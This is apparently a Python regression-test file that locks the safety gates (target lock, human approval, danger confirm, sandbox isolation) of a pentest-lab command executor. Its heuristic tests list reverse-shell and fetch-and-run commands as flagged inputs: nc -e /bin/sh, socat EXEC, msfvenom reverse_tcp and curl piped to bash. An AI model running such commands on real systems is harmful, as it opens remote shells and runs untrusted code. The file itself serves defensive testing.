"""Regression-lock for the Cockpit safety invariants AFTER the allowlist was removed.

Zaid's decision (2026-07-24): the cockpit drops the command allowlist — ANY single binary
+ args may run. The safety on the lab is now ISOLATION + HUMAN-APPROVAL + a heuristic
red-confirm (interpreters / reverse shells / frameworks need an extra explicit confirm).
Execution stays argv-style (never a shell).

These tests fail loudly if a SURVIVING gate is weakened. The gates the executor enforces,
in order:
  1. target lock — BEST-EFFORT: any host-shaped token in args must be the lab (cheap DiD,
                   NOT load-bearing — it can't see a host inside an arbitrary command);
  2. approval    — approved must be explicitly True (no autonomous / approve-all path);
  3. danger      — the heuristic red-confirm (interpreters / reverse shells / frameworks);
  4. isolation   — the sandbox must be attached ONLY to internal networks (the REAL lab
                   containment — arbitrary commands are trapped in the egress-less network).

Hermetic: gates 1–3 need no Docker; isolation (4) is simulated via monkeypatch. Run:
  python test_cockpit.py
"""
from __future__ import annotations

from cockpit import allowlist as A
from cockpit import executor as E
from cockpit import sandbox as S
from cockpit.models import ExecRequest
from cockpit.sandbox import SandboxError

_LAB = "hackpit-lab-target"


def test_no_allowlist_any_binary_runs() -> None:
    """The allowlist gate is GONE: any binary + args passes what used to reject it. A
    command that isn't a former recon/active tool (gobuster, python, a made-up binary)
    reaches approval/danger/isolation, not an allowlist rejection."""
    for cmd, args in (
        ("gobuster", ["dir", "-u", f"http://{_LAB}:3000/", "-w", "words.txt"]),
        ("python3", ["-c", "print(1)", _LAB]),  # references the lab so the target-lock passes
        ("nikto", ["-h", _LAB]),
        ("a-totally-made-up-binary", [_LAB]),
    ):
        r = E.validate_request(ExecRequest(command=cmd, args=args, approved=True, dangerous_ack=True))
        # never a target-less/allowlist reject; only isolation (sandbox) may remain
        assert r is None or r.gate == "sandbox", (
            f"{cmd} must run (no allowlist gate) — got gate={getattr(r, 'gate', None)}: "
            f"{getattr(r, 'reason', '')}"
        )
    # the allowlist gate is gone (default gate is no longer 'allowlist')
    from cockpit.models import ExecRejected
    assert ExecRejected(reason="x").gate != "allowlist"
    print("  no allowlist — any binary runs: PASS")


def test_best_effort_target_lock() -> None:
    """Every host-shaped token must be the lab; a non-lab host is rejected; a command with
    no lab reference is rejected. (Best-effort — it can't see hosts inside a payload.)"""
    for args in (
        ["-sV", _LAB],
        [f"http://{_LAB}:3000/rest"],
        ["-s", "http://lab-target/"],
        ["dir", "-u", f"http://{_LAB}:3000/", "-w", "words.txt"],  # wordlist ignored (no dot-host match needed)
    ):
        ok, reason = E.check_target_lock(args)
        assert ok, f"lab target must be allowed: {args} ({reason})"

    for args in (
        ["scanme.nmap.org"],
        ["http://169.254.169.254/latest"],   # cloud metadata
        ["http://127.0.0.1:8000"],           # host loopback
    ):
        ok, reason = E.check_target_lock(args)
        assert not ok and "not the lab" in reason, f"non-lab must be blocked: {args}"

    ok, reason = E.check_target_lock(["--help"])  # no host reference at all
    assert not ok and "no lab target" in reason, "a target-less command must be rejected"
    print("  best-effort target-lock (lab-only, host-shaped): PASS")


def test_target_lock_is_best_effort_not_load_bearing() -> None:
    """The target-lock is cheap DiD, NOT a load-bearing control — this test documents its
    KNOWN GAP so no one mistakes it for real containment: it only inspects argv tokens, so a
    lab-referencing command whose actual network target is hidden in an arbitrary payload
    still passes. ISOLATION (egress-less sandbox) is the real bound on what the lab reaches."""
    # the cheap win it DOES catch: an obvious non-lab host token
    ok, _ = E.check_target_lock(["scanme.nmap.org"])
    assert not ok, "an obvious non-lab host is caught"
    # the GAP: it cannot see intent inside arbitrary code — a lab-referencing python command
    # passes even though the code could connect anywhere (isolation, not this, stops that)
    ok, _ = E.check_target_lock(["-c", "connect_out_somehow()", _LAB])
    assert ok, "target-lock only sees argv tokens — code intent is invisible (isolation is the bound)"
    # file operands (even absolute paths / dotted names) are not mistaken for hosts
    ok, _ = E.check_target_lock(["-w", "/usr/share/wordlists/common.txt", f"http://{_LAB}/FUZZ"])
    assert ok, "a wordlist path is not a target host"
    print("  target-lock is best-effort, not load-bearing (gap documented): PASS")


def test_approval_gate() -> None:
    """approved MUST be explicitly True — there is no autonomous / approve-all path."""
    r = E.validate_request(ExecRequest(command="curl", args=["-sI", f"http://{_LAB}:3000/"]))
    assert r is not None and r.gate == "approval", "default (unapproved) must reject at approval"
    r = E.validate_request(
        ExecRequest(command="nmap", args=["-sV", _LAB], approved=False)
    )
    assert r is not None and r.gate == "approval", "approved=False must reject at approval"
    print("  approval gate: PASS")


def test_gate_order_and_first_failing_gate() -> None:
    """The surviving gates fire in order (target → approval → …), and a request failing
    several is rejected at the FIRST — target now leads (there is no allowlist gate)."""
    # non-lab target + unapproved → target beats approval
    r = E.validate_request(
        ExecRequest(command="nmap", args=["-sV", "scanme.nmap.org"], approved=False)
    )
    assert r is not None and r.gate == "target", "target-lock must fire before approval"

    # lab target but NOT approved → approval
    r = E.validate_request(ExecRequest(command="nmap", args=["-sV", _LAB], approved=False))
    assert r is not None and r.gate == "approval", "unapproved lab request must reject at approval"

    # a fully valid, approved lab request (safe binary) clears to only the isolation gate
    r = E.validate_request(ExecRequest(command="nmap", args=["-sV", _LAB], approved=True))
    assert r is None or r.gate == "sandbox", (
        f"valid approved lab request must pass target/approval/danger (got {getattr(r,'gate',None)})"
    )
    print("  gate order + first-failing-gate (target leads): PASS")


def _patch_sandbox(up, networks, internal_map):
    """Swap sandbox's docker-inspect helpers for pure fakes; returns a restore fn."""
    orig = (S.is_sandbox_up, S._sandbox_networks, S._network_is_internal)
    S.is_sandbox_up = lambda: up
    S._sandbox_networks = lambda: list(networks)
    S._network_is_internal = lambda n: internal_map[n]

    def restore():
        S.is_sandbox_up, S._sandbox_networks, S._network_is_internal = orig

    return restore


def test_isolation_assert() -> None:
    """assert_isolation_proven refuses unless the sandbox is attached ONLY to internal
    networks — the REAL lab containment now that arbitrary commands can run. Simulated."""
    restore = _patch_sandbox(True, ["hackpit_isolated"], {"hackpit_isolated": True})
    try:
        S.assert_isolation_proven()  # returns None on success
    finally:
        restore()

    restore = _patch_sandbox(
        True, ["hackpit_isolated", "bridge"], {"hackpit_isolated": True, "bridge": False}
    )
    try:
        raised = False
        try:
            S.assert_isolation_proven()
        except SandboxError as exc:
            raised = True
            assert "non-internal" in str(exc) and "bridge" in str(exc)
        assert raised, "a non-internal network MUST make isolation refuse"
    finally:
        restore()

    for shape, needle in ((( False, [], {}), "not running"), ((True, [], {}), "no network")):
        up, nets, imap = shape
        restore = _patch_sandbox(up, nets, imap)
        try:
            raised = False
            try:
                S.assert_isolation_proven()
            except SandboxError as exc:
                raised = True
                assert needle in str(exc)
            assert raised, f"isolation must refuse ({needle})"
        finally:
            restore()
    print("  isolation assert (simulated): PASS")


def test_isolation_gate_in_validate() -> None:
    """The gate chain actually reaches isolation: with target/approval/danger passed, a
    failing isolation check surfaces as gate=sandbox, and a passing one clears all."""
    orig = E.assert_isolation_proven

    def _raise():
        raise SandboxError("simulated: sandbox attached to non-internal network")

    try:
        E.assert_isolation_proven = _raise
        r = E.validate_request(ExecRequest(command="nmap", args=["-sV", _LAB], approved=True))
        assert r is not None and r.gate == "sandbox", "isolation failure must be gate=sandbox"

        E.assert_isolation_proven = lambda: None
        r = E.validate_request(ExecRequest(command="nmap", args=["-sV", _LAB], approved=True))
        assert r is None, "a fully valid, isolated request must clear all gates"
    finally:
        E.assert_isolation_proven = orig
    print("  isolation gate reached in validate_request: PASS")


def test_heuristic_flags_dangerous_commands() -> None:
    """The heuristic red-confirm flags arbitrary-code / reverse-shell / framework commands
    in the forms they appear — the interpreter binary itself, nc/socat -e, an eval flag in
    any form, and reverse-shell shapes in the payload. Over-inclusive by design."""
    H = A.dangerous_command_heuristic
    for cmd, args in (
        ("python3", ["-c", "import os; os.system('id')"]),   # interpreter + eval
        ("/usr/bin/python", ["-c", "1"]),                    # full path basename'd
        ("bash", ["-c", "id"]),
        ("sh", ["exploit.sh"]),                              # interpreter, no eval flag
        ("perl", ["-e", "print 1"]),
        ("php", ["-r", "phpinfo();"]),
        ("ruby", ["-e", "puts 1"]),
        ("node", ["-e", "process.exit()"]),
        ("nc", ["-e", "/bin/sh", "10.0.0.1", "4444"]),       # reverse shell
        ("ncat", ["-c", "bash", "host", "9001"]),
        ("socat", ["TCP:host:1", "EXEC:/bin/bash"]),
        ("msfvenom", ["-p", "linux/x64/shell_reverse_tcp"]),
        ("msfconsole", ["-q"]),
        ("curl", ["http://x/", "|", "bash"]),                # pipe-to-shell shape in args
        ("python3", ["-c", "s=__import__('socket'); import subprocess"]),  # marker: subprocess
    ):
        reasons = H(cmd, args)
        assert reasons, f"heuristic must flag {cmd} {args}"
    # combined-short eval flag is still caught (parser reuse): python -Xc ... would surface -c
    assert A.dangerous_command_heuristic("python3", ["-cX"]) or \
        A.dangerous_command_heuristic("python3", ["-c"]), "an eval flag in a cluster is caught"
    print("  heuristic flags dangerous commands (interpreters/nc -e/reverse shells/msf): PASS")


def test_heuristic_clean_for_safe_commands() -> None:
    """A plainly-safe scan/fetch is NOT flagged (a false positive only costs a confirm, but
    the common tools should stay clean so the confirm means something)."""
    H = A.dangerous_command_heuristic
    for cmd, args in (
        ("nmap", ["-sV", "-p", "80,443", _LAB]),
        ("curl", ["-sI", f"http://{_LAB}:3000/"]),
        ("whatweb", [f"http://{_LAB}:3000/"]),
        ("sqlmap", ["-u", f"http://{_LAB}:3000/rest/products/search?q=1", "--batch", "--dbs"]),
        ("ffuf", ["-u", f"http://{_LAB}:3000/FUZZ", "-w", "words.txt", "-mc", "200"]),
        ("nuclei", ["-u", f"http://{_LAB}:3000/", "-t", "cves/"]),
        ("gobuster", ["dir", "-u", f"http://{_LAB}:3000/", "-w", "words.txt"]),
    ):
        assert H(cmd, args) == [], f"a safe command must NOT be flagged: {cmd} {args}"
    print("  heuristic clean for safe recon/exploit commands: PASS")


def test_danger_gate_requires_confirm() -> None:
    """A heuristic-flagged command is REFUSED unless dangerous_ack is explicitly true —
    approve alone is not enough. NEVER blocked; the confirm is required (test-locked)."""
    flagged = ExecRequest(command="python3", args=["-c", "print(1)", _LAB], approved=True)
    r = E.validate_request(flagged)
    assert r is not None and r.gate == "danger" and r.dangerous_flags, (
        "a flagged command must refuse at the danger gate without the confirm"
    )
    r = E.validate_request(
        ExecRequest(command="python3", args=["-c", "print(1)", _LAB], approved=True, dangerous_ack=True)
    )
    assert r is None or r.gate == "sandbox", "the explicit confirm must clear the danger gate"
    # not approved → approval precedes danger
    r = E.validate_request(
        ExecRequest(command="python3", args=["-c", "print(1)", _LAB], approved=False, dangerous_ack=True)
    )
    assert r is not None and r.gate == "approval", "approval precedes the danger gate"
    # a safe command needs no confirm
    r = E.validate_request(ExecRequest(command="nmap", args=["-sV", _LAB], approved=True))
    assert r is None or r.gate == "sandbox", "a safe command needs no confirm"
    print("  danger gate: flagged command needs an explicit confirm (test-locked): PASS")


if __name__ == "__main__":
    test_no_allowlist_any_binary_runs()
    test_best_effort_target_lock()
    test_target_lock_is_best_effort_not_load_bearing()
    test_approval_gate()
    test_gate_order_and_first_failing_gate()
    test_heuristic_flags_dangerous_commands()
    test_heuristic_clean_for_safe_commands()
    test_danger_gate_requires_confirm()
    test_isolation_assert()
    test_isolation_gate_in_validate()
    print("ALL cockpit safety-layer tests pass")
